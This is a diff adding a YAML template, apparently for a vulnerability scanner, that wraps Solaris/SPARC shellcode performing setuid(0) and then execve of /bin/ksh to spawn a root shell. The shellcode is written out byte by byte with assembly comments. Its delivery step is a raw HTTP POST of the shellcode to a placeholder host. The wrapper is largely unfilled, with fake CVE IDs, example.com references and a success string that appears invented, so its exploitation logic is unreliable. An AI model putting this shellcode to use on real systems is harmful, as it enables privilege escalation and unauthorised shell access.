@@ -1,0 +1,55 @@
+id: solaris_sparc_shellcode
+info:
+name: Solaris SPARC Shellcode - setuid(0) + execve(/bin/ksh)
+author: pwnme
+description: Pretty standard Solaris/SPARC setuid/execve shellcode.
+tested_on: SunOS 5.10 Generic_Virtual sun4u sparc SUNW,SPARC-Enterprise
+cve: # If applicable, you can specify CVE IDs associated with this shellcode
+- CVE-XXXX-XXXX
+- CVE-XXXX-XXXX
+references: # Add any relevant links or references here
+- https://example.com/solaris_sparc_shellcode
+- https://github.com/username/repo
+
+requests:
+- name: solaris_sparc_shellcode_exploit
+type: raw
+request: |
+# Replace this section with the HTTP request that delivers the shellcode.
+# For example, the request to a vulnerable endpoint or file upload functionality.
+
+# HTTP Request (e.g., POST request to upload shellcode)
+POST /upload HTTP/1.1
+Host: vulnerable.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0)
+Content-Type: application/octet-stream
+Content-Length: {{ shellcode_length }}
+Connection: close
+
+{{ shellcode }}
+
+matchers:
+- type: word
+words:
+- "Exploited successfully" # Adjust the response text to match a successful exploitation.
+condition: and
+
+options:
+shellcode:
+description: Solaris/SPARC execve() shellcode
+required: true
+example: |-
+"\x90\x08\x3f\xff" /* and %g0, -1, %o0 */
+"\x82\x10\x20\x17" /* mov 0x17, %g1 */
+"\x91\xd0\x20\x08" /* ta 8 */
+"\x9f\x41\x40\x01" /* rd %pc,%o7 ! >= sparcv8+ */
+"\x90\x03\xe0\x28" /* add %o7, 0x28, %o0 */
+"\x92\x02\x20\x10" /* add %o0, 0x10, %o1 */
+"\xc0\x22\x20\x08" /* clr [ %o0 + 8 ] */
+"\xd0\x22\x20\x10" /* st %o0, [ %o0 + 0x10 ] */
+"\xc0\x22\x20\x14" /* clr [ %o0 + 0x14 ] */
+"\x82\x10\x20\x0b" /* mov 0xb, %g1 */
+"\x91\xd0\x20\x08" /* ta 8 */
+"\x80\x1c\x40\x11" /* xor %l1, %l1, %g0 ! nop */
+"\x41\x41\x41\x41" /* placeholder */
+"/bin/ksh" 
